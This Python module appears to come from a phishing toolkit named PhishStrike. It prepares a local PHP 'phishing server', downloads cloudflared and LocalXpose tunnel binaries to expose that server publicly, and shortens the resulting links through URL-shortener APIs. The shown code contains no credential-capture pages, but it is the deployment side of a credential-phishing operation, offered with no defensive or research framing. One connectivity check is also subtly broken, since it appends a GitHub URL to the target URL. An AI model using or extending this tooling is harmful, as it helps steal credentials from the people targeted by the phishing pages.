import os
import sys
import time
import shutil
import urllib.request
import subprocess
import platform
import zipfile
import tarfile
import json
import re

from phishstrike.core import database
from phishstrike.lib import terminal_ui as ui

# Base Directory resolved to PhishStrike root
BASE_DIR = os.path.dirname(os.path.dirname(os.path.dirname(os.path.realpath(__file__))))
HOST = "127.0.0.1"


def setup_env():
    server_dir = os.path.join(BASE_DIR, ".server")
    auth_dir = os.path.join(BASE_DIR, "auth")
    www_dir = os.path.join(server_dir, "www")

    if not os.path.isdir(server_dir):
        os.makedirs(server_dir)
    if not os.path.isdir(auth_dir):
        os.makedirs(auth_dir)

    database.init_db()  # Initialize SQLite

    if os.path.isdir(www_dir):
        shutil.rmtree(www_dir)
    os.makedirs(www_dir)

    loclx_log = os.path.join(server_dir, ".loclx")
    cld_log = os.path.join(server_dir, ".cld.log")

    if os.path.exists(loclx_log):
        os.remove(loclx_log)
    if os.path.exists(cld_log):
        os.remove(cld_log)


def kill_pid():
    if platform.system() == "Windows":
        for exe in ["php.exe", "cloudflared.exe", "loclx.exe"]:
            subprocess.run(
                ["taskkill", "/F", "/IM", exe],
                capture_output=True,
                shell=True,
            )
        # Kill any existing dashboard on port 5000 (parse netstat output in Python)
        try:
            result = subprocess.run(
                ["netstat", "-ano"],
                capture_output=True,
                text=True,
                shell=True,
            )
            for line in result.stdout.splitlines():
                if ":5000" in line and "LISTENING" in line:
                    parts = line.strip().split()
                    if parts:
                        pid = parts[-1]
                        subprocess.run(
                            ["taskkill", "/F", "/PID", pid],
                            capture_output=True,
                            shell=True,
                        )
        except Exception:
            pass
    else:
        for p in ["php", "cloudflared", "loclx"]:
            subprocess.run(
                ["killall", p],
                capture_output=True,
            )
        subprocess.run(
            ["fuser", "-k", "5000/tcp"],
            capture_output=True,
        )


def check_status():
    status_msg = "    [+] Probing Network Connectivity..."
    sys.stdout.write(ui.gradient_text(status_msg, ui.RGB_PURPLE, ui.RGB_BLUE))
    sys.stdout.flush()

    for _ in range(6):
        dots = "." * (_ % 4)
        sys.stdout.write(
            f"\r    {ui.gradient_text('[*] Scanning Network' + dots.ljust(3), ui.RGB_PURPLE, ui.RGB_BLUE)}"
        )
        sys.stdout.flush()
        time.sleep(0.15)

    try:
        urllib.request.urlopen("https://api.github.com", timeout=3)
        sys.stdout.write(
            f"\r    {ui.gradient_text('[+] System Status: ', ui.RGB_PURPLE, ui.RGB_BLUE)}{ui.BOLD}\033[32mONLINE{' ' * 20}{ui.RESET}\n"
        )
    except Exception:
        sys.stdout.write(
            f"\r    {ui.gradient_text('[+] System Status: ', ui.RGB_PURPLE, ui.RGB_BLUE)}{ui.BOLD}\033[31mOFFLINE{' ' * 20}{ui.RESET}\n"
        )


def dependencies():
    ui.glitch_print(
        " [!] INITIALIZING SYSTEM CORE & DEPENDENCIES ",
        duration=0.5,
        start_rgb=ui.RGB_PURPLE,
        end_rgb=ui.RGB_CYAN,
    )

    # Check for PHP (Hard dependency)
    php_path = shutil.which("php") or shutil.which("php.exe")

    if php_path is None:
        print(f"\n    {ui.DARK}\x5b{ui.PINK}!{ui.DARK}\x5d{ui.PINK} CRITICAL ERROR: PHP NOT FOUND!")
        print(
            f"    {ui.DARK}\x5b{ui.WHITE}-{ui.DARK}\x5d{ui.LIGHT2} PHP is required to run the local phishing server."
        )
        print(
            f"    {ui.DARK}\x5b{ui.WHITE}-{ui.DARK}\x5d{ui.LIGHT2} Please install PHP and add it to your PATH."
        )
        if platform.system() != "Windows":
            print(
                f"    {ui.DARK}\x5b{ui.WHITE}-{ui.DARK}\x5d{ui.LIGHT1} Hint: Run 'sudo apt install php' (for Debian/Ubuntu)"
            )
        else:
            print(
                f"    {ui.DARK}\x5b{ui.WHITE}-{ui.DARK}\x5d{ui.LIGHT1} Download: https://www.php.net/downloads.php"
            )
        print()
        sys.exit(1)

    return php_path


def download(url, output):
    file_name = os.path.basename(url)
    if os.path.exists(file_name):
        os.remove(file_name)
    if os.path.exists(output):
        os.remove(output)
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req) as response, open(file_name, "wb") as out_file:
            shutil.copyfileobj(response, out_file)

        if file_name.endswith(".zip"):
            with zipfile.ZipFile(file_name, "r") as zip_ref:
                zip_ref.extractall()
            dest = os.path.join(BASE_DIR, ".server", output)
            os.rename(
                zip_ref.namelist()[0] if output not in file_name else output,
                dest,
            )
        elif file_name.endswith(".tgz") or file_name.endswith(".tar.gz"):
            with tarfile.open(file_name, "r:gz") as tar_ref:
                tar_ref.extractall()
            dest = os.path.join(BASE_DIR, ".server", output)
            os.rename(file_name.replace(".tgz", ""), dest)
        else:
            dest = os.path.join(BASE_DIR, ".server", output)
            shutil.move(file_name, dest)

        if not platform.system() == "Windows":
            os.chmod(dest, 0o755)

        if os.path.exists(file_name):
            os.remove(file_name)
    except Exception as e:
        print(
            f"\n{ui.DARK}[{ui.WHITE}!{ui.DARK}]{ui.DARK} Error downloading {output}: {e}"
        )
        ui.reset_color()
        sys.exit(1)


def install_cloudflared():
    cld_bin = os.path.join(
        BASE_DIR,
        ".server",
        "cloudflared.exe" if platform.system() == "Windows" else "cloudflared",
    )
    if os.path.exists(cld_bin):
        print(f"\n{ui.PURPLE}[{ui.LIGHT1}+{ui.PURPLE}]{ui.PURPLE} Cloudflared already installed.")
        if platform.system() != "Windows":
            os.chmod(cld_bin, 0o755)
    else:
        print(
            f"\n{ui.PURPLE}[{ui.LIGHT1}+{ui.PURPLE}]{ui.LIGHT2} Installing Cloudflared...{ui.LIGHT1}"
        )
        arch = platform.machine().lower()
        if platform.system() == "Windows":
            download(
                "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe",
                "cloudflared.exe",
            )
        elif "arm" in arch or "aarch64" in arch:
            download(
                "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64",
                "cloudflared",
            )
        elif "x86_64" in arch or "amd64" in arch:
            download(
                "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64",
                "cloudflared",
            )
        else:
            download(
                "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386",
                "cloudflared",
            )


def install_localxpose():
    loclx_bin = os.path.join(
        BASE_DIR, ".server", "loclx.exe" if platform.system() == "Windows" else "loclx"
    )
    if os.path.exists(loclx_bin):
        print(f"\n{ui.PURPLE}[{ui.LIGHT1}+{ui.PURPLE}]{ui.PURPLE} LocalXpose already installed.")
        if platform.system() != "Windows":
            os.chmod(loclx_bin, 0o755)
    else:
        print(f"\n{ui.PURPLE}[{ui.LIGHT1}+{ui.PURPLE}]{ui.LIGHT2} Installing LocalXpose...{ui.LIGHT1}")
        arch = platform.machine().lower()
        if platform.system() == "Windows":
            download(
                "https://api.localxpose.io/api/v2/downloads/loclx-windows-amd64.zip",
                "loclx.exe",
            )
        elif "arm" in arch or "aarch64" in arch:
            download(
                "https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip",
                "loclx",
            )
        elif "x86_64" in arch or "amd64" in arch:
            download(
                "https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip",
                "loclx",
            )
        else:
            download(
                "https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip",
                "loclx",
            )


def get_site_stats(url):
    try:
        urllib.request.urlopen(url + "https://github.com", timeout=3)
        return True
    except Exception:
        return False

# Compatibility wrapper
def site_stat(url):
    return get_site_stats(url)


def shorten(api, url):
    try:
        req = urllib.request.Request(api + url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req) as response:
            data = response.read().decode("utf-8")
            if "shrtco.de" in api:
                js = json.loads(data)
                return js.get("result", {}).get("short_link2", "")
            else:
                return data.strip()
    except Exception:
        return ""
